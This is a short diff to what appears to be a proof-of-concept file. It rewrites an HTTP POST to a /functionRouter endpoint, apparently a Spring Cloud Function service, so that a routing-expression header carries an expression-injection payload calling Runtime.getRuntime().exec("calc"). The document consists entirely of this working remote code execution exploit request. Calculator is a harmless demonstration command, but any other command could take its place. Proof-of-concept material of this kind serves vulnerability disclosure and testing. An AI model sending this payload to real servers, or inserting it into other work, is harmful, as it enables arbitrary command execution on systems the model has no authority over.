@@ -18,7 +18,7 @@ POC:
 
 POST /functionRouter HTTP/1.1
 Host: localhost:8080
-spring.cloud.function.definition: reverseString
+spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("calc")
 Content-Type: text/plain
 Content-Length: 3
 abc
